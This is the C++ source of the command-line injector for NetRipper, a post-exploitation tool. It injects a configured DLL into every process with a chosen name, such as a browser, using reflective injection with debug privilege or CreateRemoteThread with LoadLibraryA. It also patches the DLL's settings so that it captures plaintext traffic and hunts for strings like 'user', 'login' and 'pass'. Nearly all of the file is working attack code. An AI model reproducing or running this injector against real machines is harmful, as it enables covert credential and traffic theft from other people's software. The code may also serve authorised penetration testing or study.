/*
	Name:   NetRipper Project
	Author: Ionut Popescu <ionut.popescu@outlook.com>
*/

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include "stdafx.h"
#include <iostream>
#include <vector>
#include <string>
#include <cstdio>
#include <windows.h>
#include <TlHelp32.h> 
#include <Shlwapi.h>
#include "LoadLibraryR.h"

#pragma comment(lib, "Shlwapi.lib")

using namespace std;

// Temporary configured DLL

#define TEMP_DLL_FILE  "ConfiguredDLL.dll"

// Default configuration

#define DEFAULT_CONFIG \
	"<NetRipper>" \
	"<plaintext>true</plaintext>" \
	"<datalimit>4096</datalimit>" \
	"<stringfinder>user,login,pass,database,config</stringfinder>" \
	"<data_path>TEMP</data_path>" \
	"</NetRipper>"

// Function prototypes

vector<PROCESSENTRY32> GetProcesses();
vector<MODULEENTRY32> GetProcessModules(DWORD p_dwID);
string ToLower(string p_sString);

BOOL InjectAllByName(string p_sDLLName, string p_sProcessName);

BOOL ReflectiveInject(string p_sDLLName, DWORD p_dwID);
BOOL NormalInject(string p_sDLLName, DWORD p_dwID);

string GenerateData(string p_sPlain, string p_sLimit, string p_sFinder, string p_sLocation);
bool ReplaceData(string p_sDLL, string p_sData);

// Specify injection method

bool g_bUseReflectiveInjection = true;

// Print help

void PrintHelp()
{
	cout << endl;

	cout << "Injection: NetRipper.exe DLLpath.dll processname.exe" << endl;
	cout << "Example:   NetRipper.exe DLL.dll firefox.exe [--noreflective]" << endl << endl;

	cout << "Generate DLL:" << endl << endl;
	cout << "  -h,  --help          Print this help message" << endl;
	cout << "  -w,  --write         Full path for the DLL to write the configuration data" << endl;
	cout << "  -l,  --location      Full path where to save data files (default TEMP)" << endl << endl;

	cout << "Plugins:" << endl << endl;
	cout << "  -p,  --plaintext     Capture only plain-text data. E.g. true" << endl;
	cout << "  -d,  --datalimit     Limit capture size per request. E.g. 4096" << endl;
	cout << "  -s,  --stringfinder  Find specific strings. E.g. user,pass,config" << endl << endl;

	cout << "Example: NetRipper.exe -w DLL.dll -l TEMP -p true -d 4096 -s user,pass" << endl << endl;
}

// Main

int _tmain(int argc, char* argv[])
{
	// Arguments

	if(argc == 1)
	{
		PrintHelp();
		return 0;
	}

	// DLL Injection

	if(argc == 3 || argc == 4)
	{
		if(argv[1][0] != '-' && argv[2][0] != '-')
		{
			// Inject DLL

			string sDLL = argv[1];
			string sProcess = argv[2];
			cout << "INFO: Trying to inject " << sDLL << " in " << sProcess << endl;

			// Injection method

			if (argc == 4)
			{
				string arg4 = argv[3];
				if (arg4.compare("--noreflective") == 0) g_bUseReflectiveInjection = false;
			}

			// Inject
	
			InjectAllByName(sDLL, sProcess);

			return 0;
		}
	}

	// Each value

	string sDLL      = "";
	string sLocation = "TEMP";
	string sPlain    = "true";
	string sLimit    = "4096";
	string sFinder   = "user,login,pass,database,config";

	// All options

	for(int i = 0; i < argc; i++)
	{
		string sArg = argv[i];

		// Help

		if(sArg.compare("-h") == 0 || sArg.compare("--help") == 0)
		{
			PrintHelp();
			return 0;
		}

		// Write DLL

		if(sArg.compare("-w") == 0 || sArg.compare("--write") == 0)
		{
			if(argv[i + 1] == NULL || argv[i + 1][0] == '-') 
			{
				cout << endl << "ERROR: Invalid option specified: " << sArg << endl;
				return 1;
			}

			sDLL = (string)argv[i + 1];
		}

		// Location

		if(sArg.compare("-l") == 0 || sArg.compare("--location") == 0)
		{
			if(argv[i + 1] == NULL || argv[i + 1][0] == '-') 
			{
				cout << endl << "ERROR: Invalid option specified: " << sArg << endl;
				return 1;
			}

			sLocation = (string)argv[i + 1];
		}

		// Plain

		if(sArg.compare("-p") == 0 || sArg.compare("--plaintext") == 0)
		{
			if(argv[i + 1] == NULL || argv[i + 1][0] == '-') 
			{
				cout << endl << "ERROR: Invalid option specified: " << sArg << endl;
				return 1;
			}

			sPlain = (string)argv[i + 1];
		}

		// Limit

		if(sArg.compare("-d") == 0 || sArg.compare("--datalimit") == 0)
		{
			if(argv[i + 1] == NULL || argv[i + 1][0] == '-') 
			{
				cout << endl << "ERROR: Invalid option specified: " << sArg << endl;
				return 1;
			}

			sLimit = (string)argv[i + 1];
		}

		// Finder

		if(sArg.compare("-s") == 0 || sArg.compare("--stringfinder") == 0)
		{
			if(argv[i + 1] == NULL || argv[i + 1][0] == '-') 
			{
				cout << endl << "ERROR: Invalid option specified: " << sArg << endl;
				return 1;
			}

			sFinder = (string)argv[i + 1];
		}
	}

	// Write data to new DLL

	if(ReplaceData(sDLL, GenerateData(sPlain, sLimit, sFinder, sLocation)) == true)
		cout << endl << "SUCCESS: DLL succesfully created: " << TEMP_DLL_FILE << endl;
	else 
		cout << endl << "ERROR: Cannot create DLL " << TEMP_DLL_FILE << endl;

	return 0;
}

// Generate XML data

string GenerateData(string p_sPlain, string p_sLimit, string p_sFinder, string p_sLocation)
{
	string sResult = "<NetRipper>";

	// Add options

	sResult += "<plaintext>";
	sResult += p_sPlain;
	sResult += "</plaintext>";

	sResult += "<datalimit>";
	sResult += p_sLimit;
	sResult += "</datalimit>";

	sResult += "<stringfinder>";
	sResult += p_sFinder;
	sResult += "</stringfinder>";

	sResult += "<data_path>";
	sResult += p_sLocation;
	sResult += "</data_path>";

	sResult += "</NetRipper>";

	// Check length

	if (sResult.length() > 1000)
	{
		cout << "ERROR: Configuration string must be less than 1000 bytes!" << endl;
		return DEFAULT_CONFIG;
	}

	// Add padding

	for (size_t j = 0; j < 1000 - sResult.length(); j++)
		sResult += '-';

	return sResult;
}

// Replace configuration data into DLL

bool ReplaceData(string p_sDLL, string p_sData)
{
	HANDLE hFile = NULL;
	FILE *pFile;
	size_t nWritten = 0;
	unsigned char *lpBuffer = NULL;
	DWORD dwLength = 0, dwBytesRead = 0;
	
	// Open DLL for read

	hFile = CreateFileA( p_sDLL.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );

	if( hFile == INVALID_HANDLE_VALUE )
	{
		cout << "ERROR: Cannot read DLL file: " << p_sDLL << endl;
		return FALSE;
	}

	// Get DLL size

	dwLength = GetFileSize( hFile, NULL );
	
	if( dwLength == INVALID_FILE_SIZE || dwLength == 0 )
	{
		cout << "ERROR: Failed to get the DLL file size" << endl;
		return FALSE;
	}

	// Allocate space for DLL

	lpBuffer = (unsigned char *)HeapAlloc( GetProcessHeap(), 0, dwLength );
		
	if( !lpBuffer )
	{
		cout << "ERROR: Failed to get the DLL file size" << endl;
		return FALSE;
	}

	// Read DLL

	if( ReadFile( hFile, lpBuffer, dwLength, &dwBytesRead, NULL ) == FALSE )
	{
		cout << "ERROR: Failed to alloc a buffer!" << endl;
		return FALSE;
	}

	// Parse data buffer and find XML settings

	unsigned char pcSearchString[] = "<NetRipper>";
	DWORD dwSearchSize = 11;
	BOOL bFound = TRUE;

	for(DWORD i = 0; i < dwBytesRead - dwSearchSize; i++)
	{
		bFound = TRUE;

		for(DWORD j = i; j < i + dwSearchSize; j++)
		{
			if(lpBuffer[j] != pcSearchString[j - i]) bFound = FALSE;
		}

		// Found data, write data

		if(bFound) 
		{
			// Open file
	
			pFile = fopen(TEMP_DLL_FILE, "wb");

			if(pFile == NULL) 
			{
				cout << "ERROR: Cannot open temporary DLL file: " << TEMP_DLL_FILE << endl;
				return FALSE;;
			}

			// Write first chunk of data

			nWritten = fwrite(lpBuffer , sizeof(char), i, pFile);

			if(nWritten != i)
			{
				cout << "ERROR: Cannot write first chunk to temporary DLL file: " << TEMP_DLL_FILE << endl;
				return false;
			}

			// Write configured data p_sData

			nWritten = fwrite(p_sData.c_str(), sizeof(char), p_sData.length(), pFile);

			if(nWritten != p_sData.length())
			{
				cout << "ERROR: Cannot write configured data to temporary DLL file: " << TEMP_DLL_FILE << endl;
				return FALSE;
			}

			// Write the rest of the DLL

			nWritten = fwrite(lpBuffer + i + p_sData.length(), sizeof(char), dwBytesRead - i - p_sData.length(), pFile);

			if(nWritten != dwBytesRead - i - p_sData.length())
			{
				cout << "ERROR: Cannot write full data to temporary DLL file: " << TEMP_DLL_FILE << endl;
				return FALSE;
			}
			
			fclose(pFile);
		}
	}

	// Cleanup

	if( hFile )
		CloseHandle( hFile );

	if( lpBuffer )
		HeapFree( GetProcessHeap(), 0, lpBuffer );

	return TRUE;
}

// Function that returns a vector with all processes

vector<PROCESSENTRY32> GetProcesses()
{
    HANDLE hSnapshot;
    PROCESSENTRY32 hProcess;
	vector<PROCESSENTRY32> vProcesses;
	
	/* Get processes snapshot */
	
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if(hSnapshot == INVALID_HANDLE_VALUE)
	{
		cout << "ERROR: Cannot get process list!" << endl;
		return vProcesses;
	}
	
	// Get first process
	
	hProcess.dwSize = sizeof(PROCESSENTRY32);
	
	if(!Process32First(hSnapshot, &hProcess))
	{
		cout << "ERROR: Cannot get first process!" << endl;
		return vProcesses;
	}
	
	vProcesses.push_back(hProcess);
	
	// Get all processes
	
	while(Process32Next(hSnapshot, &hProcess)) 
		vProcesses.push_back(hProcess);

	return vProcesses;
}

// Function that returns a vector with all modules from a process

vector<MODULEENTRY32> GetProcessModules(DWORD p_dwID)
{
	HANDLE hSnapshot;
	MODULEENTRY32 hModule;
	vector<MODULEENTRY32> vModules;
	
	/* Get processes snapshot */
	
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, p_dwID);
	
	if(hSnapshot == INVALID_HANDLE_VALUE)
	{
		cout << "ERROR: Cannt get process list!" << endl;
		return vModules;
	}
	
	hModule.dwSize = sizeof(MODULEENTRY32); 
	
	// Get first process
	
	if(!Module32First(hSnapshot, &hModule))
	{
		cout << "ERROR: Cannot get first process!" << endl;
		return vModules;
	}
	
	vModules.push_back(hModule);
	
	// Get all processes
	
	while(Module32Next(hSnapshot, &hModule)) 
		vModules.push_back(hModule);

	return vModules;
}

// Will inject a DLL in all processes with specified name

BOOL InjectAllByName(string p_sDLLName, string p_sProcessName)
{
    bool bResult = true;
    vector<PROCESSENTRY32> vProcesses = GetProcesses();

	p_sProcessName = ToLower(p_sProcessName);

	// Check all processes

	for(size_t i = 0; i < vProcesses.size(); i++)
	{
		if(p_sProcessName.compare(ToLower(vProcesses[i].szExeFile)) == 0) 
		{
			if (g_bUseReflectiveInjection)
			{
				if (ReflectiveInject(p_sDLLName, vProcesses[i].th32ProcessID) == false)
				{
					bResult = false;
					cout << "ERROR: Cannot reflectively inject in: " << vProcesses[i].th32ProcessID << endl;
				}
				else cout << "SUCCESS: Reflectively injected in: " << vProcesses[i].th32ProcessID << endl;
			}
			else
			{
				if (NormalInject(p_sDLLName, vProcesses[i].th32ProcessID) == false)
				{
					bResult = false;
					cout << "ERROR: Cannot inject in: " << vProcesses[i].th32ProcessID << endl;
				}
				else cout << "SUCCESS: Injected in: " << vProcesses[i].th32ProcessID << endl;
			}
		}
	}

	return bResult;
}

// Function for Reflective DLL Injection
// Adaptation of the original version from Inject.c of ReflectiveDLL project
// https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/inject/src/Inject.c 

BOOL ReflectiveInject(string p_sDLLName, DWORD p_dwID)
{
	HANDLE hFile          = NULL;
	HANDLE hModule        = NULL;
	HANDLE hProcess       = NULL;
	HANDLE hToken         = NULL;
	LPVOID lpBuffer       = NULL;
	DWORD dwLength        = 0;
	DWORD dwBytesRead     = 0;
	TOKEN_PRIVILEGES priv = {0};
	BOOL bResult          = TRUE;
	BOOL bIs32Bit         = FALSE;

	do
	{
		// Open DLL for read

		hFile = CreateFileA( p_sDLLName.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );

		if( hFile == INVALID_HANDLE_VALUE )
		{
			cout << "ERROR: Cannot read DLL file: " << p_sDLLName << endl;
			bResult = FALSE; break;
		}

		// Get DLL size

		dwLength = GetFileSize( hFile, NULL );
	
		if( dwLength == INVALID_FILE_SIZE || dwLength == 0 )
		{
			cout << "ERROR: Failed to get the DLL file size" << endl;
			bResult = FALSE; break;
		}

		// Allocate space for DLL

		lpBuffer = HeapAlloc( GetProcessHeap(), 0, dwLength );
		
		if( !lpBuffer )
		{
			cout << "ERROR: Failed to allocate memory" << endl;
			bResult = FALSE; break;
		}

		// Read DLL

		if( ReadFile( hFile, lpBuffer, dwLength, &dwBytesRead, NULL ) == FALSE )
		{
			cout << "ERROR: Failed to read the file" << endl;
			bResult = FALSE; break;
		}

		// Adjust privileges

		if( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) )
		{
			priv.PrivilegeCount           = 1;
			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		
			if( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid ) )
				AdjustTokenPrivileges( hToken, FALSE, &priv, 0, NULL, NULL );

			CloseHandle( hToken );
		}

		// Open target process

		hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, p_dwID );
		
		if( !hProcess )
		{
			cout << "ERROR: Failed to open the target process" << endl;
			bResult = FALSE; break;
		}

		// Inject reflective DLL

		hModule = LoadRemoteLibraryR( hProcess, lpBuffer, dwLength, NULL );
		
		if( !hModule )
		{
			cout << "ERROR: Failed to inject the DLL in process: "<< p_dwID << endl;
			bResult = FALSE; break;
		}
		
		WaitForSingleObject( hModule, -1 );
	
	} while(0);

	// Cleanup

	if( hFile )
		CloseHandle( hFile );

	if( lpBuffer )
		HeapFree( GetProcessHeap(), 0, lpBuffer );

	if( hProcess )
		CloseHandle( hProcess );

	return bResult;
}

// Good old injection method

BOOL NormalInject(string p_sDLLName, DWORD p_dwID)
{
	HANDLE hProcess, hRemoteThread;
	LPVOID pvString, pvLoadLibrary;
	BOOL bResult;
	string sDLLPath = "";

	// We need full DLL path for normal injection

	if (PathIsRelative(p_sDLLName.c_str()))
	{
		char pCurrentDirectory[256];
		if (GetCurrentDirectory(256, pCurrentDirectory) == 0)
		{
			cout << "Error: Cannot get current directory, please provide full DLL path!" << endl;
			return false;
		}

		sDLLPath = pCurrentDirectory;
		sDLLPath = sDLLPath + "\\";
		sDLLPath = sDLLPath + p_sDLLName;
	}
	else sDLLPath = p_sDLLName;
	
	// Open process

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, p_dwID);

	if (hProcess == NULL)
	{
		cout << "Error: Cannot open process: " << p_dwID << endl;
		return false;
	}

	// Get LoadLibrary address

	pvLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

	if (pvLoadLibrary == NULL)
	{
		cout << "Error: Cannot get LoadLibrary address to inject the DLL!" << endl;
		return false;
	}

	// Allocate space in remote process for DLL name

	pvString = (LPVOID)VirtualAllocEx(hProcess, NULL, sDLLPath.length(), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	if (pvString == NULL)
	{
		cout << "Error: Cannot allocate memory for DLL name in remote process!" << endl;
		return false;
	}

	// Write DLL name in allocated space

	SIZE_T written = 0;

	bResult = WriteProcessMemory(hProcess, (LPVOID)pvString, sDLLPath.c_str(), sDLLPath.length(), &written);

	if (!bResult)
	{
		cout << "Error: Cannot write DLL name in remote process!" << endl;
		return false;
	}

	// Create Remote thread to call "LoadLibrary(dll)"

	hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pvLoadLibrary, (LPVOID)pvString, 0, NULL);

	if (hRemoteThread == NULL)
	{
		cout << "Error: Cannot create remote thread to inject DLL!" << endl;
		return false;
	}

	CloseHandle(hProcess);

	return true;
}

// Function to convert a string to lower

string ToLower(string p_sString)
{
    string result = "";

	for(size_t i = 0; i < p_sString.length(); i++)
	{
		if(p_sString[i] >= 65 && p_sString[i] <= 90) result += (char)(p_sString[i] + 32);
		else result += p_sString[i];
	}

	return result;
}
